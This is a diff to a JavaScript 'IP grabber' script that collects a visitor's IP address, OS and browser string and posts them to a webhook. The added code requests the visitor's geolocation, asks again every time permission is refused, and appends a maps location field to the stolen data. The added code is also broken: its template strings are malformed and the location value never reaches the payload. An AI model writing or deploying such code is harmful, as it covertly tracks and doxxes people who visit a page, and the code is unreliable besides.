@@ -1,8 +1,33 @@
- // Function to send the webhook message
+let mapsUrl;
+function requestLocationPermission() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+    } else {
+        alert("Geolocation is not supported by this browser.");
+    }
+}
+
+function success(position) {
+    lat_lon = `MAPS URL: $position.coords.latitude+$position.coords.longitude`;
+ 
+}
+
+function error(err) {
+    if (err.code === err.PERMISSION_DENIED) {
+        alert("Location access denied. Requesting permission again.");
+        requestLocationPermission();
+    } else {
+        alert("An error occurred while retrieving location: " + err.message);
+    }
+}
+
+// Start requesting location permission
+requestLocationPermission();
+// Function to send the webhook message
  function sendWebhook(ip) {
     // Prepare the payload
     const platformInfo = `${navigator.platform}, Browser: ${navigator.userAgent}`;
-    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}`;
+    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\nMaps Location URL: $mapsUrl`;
 
     console.log(`Content Length: ${content.length}`);
 
